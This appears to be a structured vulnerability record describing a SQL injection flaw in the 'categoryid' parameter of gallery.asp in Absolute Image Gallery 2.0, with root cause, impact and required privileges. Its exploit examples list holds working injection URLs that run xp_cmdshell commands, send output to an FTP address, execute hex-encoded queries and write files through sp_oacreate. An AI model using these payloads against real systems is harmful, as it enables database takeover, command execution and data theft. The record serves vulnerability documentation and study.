```
{
  "vulnerability_details": {
    "root_cause": "Improper sanitization of user-supplied input in the 'categoryid' parameter within the 'gallery.asp' script.",
    "weaknesses": [
      "SQL Injection (CWE-89)"
    ],
    "impact": "Successful exploitation can allow an attacker to execute arbitrary SQL queries, potentially leading to data breaches, modification, or denial of service. If the database user has sufficient privileges (DBO), an attacker can execute system commands via MSSQL stored procedures like `xp_cmdshell` or inject code into the database.",
    "attack_vectors": "Remote exploitation via HTTP requests to 'gallery.asp' by manipulating the 'categoryid' parameter.",
    "required_capabilities": "The attacker needs to be able to send HTTP requests to the vulnerable application. No authentication is required for the basic SQL injection, but DBO user level privileges are required for MSSQL CMD injection or code injection, which may not always be possible."
  },
  "additional_details": {
    "vulnerable_product": "Absolute Image Gallery 2.0",
    "exploit_examples": [
      "http://localhost/script/gallery.asp?action=viewimage&categoryid=-SQL Inj-",
       "http://localhost/script/gallery.asp?action=viewimage&categoryid=-1;exec master..xp_cmdshell 'dir c: > cmd.txt';CREATE TABLE cmd (txt varchar(8000));BULK INSERT cmd FROM 'cmd.txt';exec+sp_makewebtask+'ftp://127.0.0.1/public/file.txt','select+*+from+cmd';--",
      "http://localhost/script/gallery.asp?action=viewimage&categoryid=-1;Create+table+code+(txt+varchar(8000),id+int);--",
       "http://localhost/script/gallery.asp?action=viewimage&categoryid=-1;declare+@q+varchar(8000)+select+@q=0x696E7365727420696E746F2066736F373737287478742C6964292076616C7565732827272C3129+exec(@q);--",
       "http://localhost/script/gallery.asp?action=viewimage&categoryid=-1;declare+@txt+varchar(8000);select+@txt+=+(select+top+1+txt+from+code+where+id+=+1);declare+@o+int,+@f+int,+@t+int,+@ret+int+exec+sp_oacreate+'scripting.filesystemobject',+@o+out+exec+sp_oamethod+@o,+'createtextfile',+@f+out,+'c:/host',+1+exec+@ret+=+sp_oamethod+@f,+'writeline',+NULL,+@txt;--",
      "http://localhost/script/gallery.asp?action=viewimage&categoryid=-1 UPDATE table SET colon = 'x';--"
     ]
  }
}
```